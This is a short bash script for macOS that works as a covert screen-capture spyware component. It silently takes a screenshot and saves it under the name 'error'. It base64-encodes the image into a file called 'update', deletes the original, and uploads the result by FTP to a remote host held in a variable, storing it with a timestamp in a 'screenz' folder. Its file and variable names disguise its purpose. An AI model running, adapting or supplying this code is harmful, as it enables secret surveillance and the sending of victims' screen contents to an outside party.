#!/bin/bash
screencapture -x -tjpg -T 10 error
openssl base64 -e -in error -out update
rm -rf error
UPDATENAME=\"$(date +\"%Y%m%d%H%M\")update\"
ftp -i -r 60 -n $DRIVERS << END_SCRIPT
quote USER $USER
quote PASS $SUPPORT
put update
rename update screenz/$UPDATENAME
quit
END_SCRIPT
exit
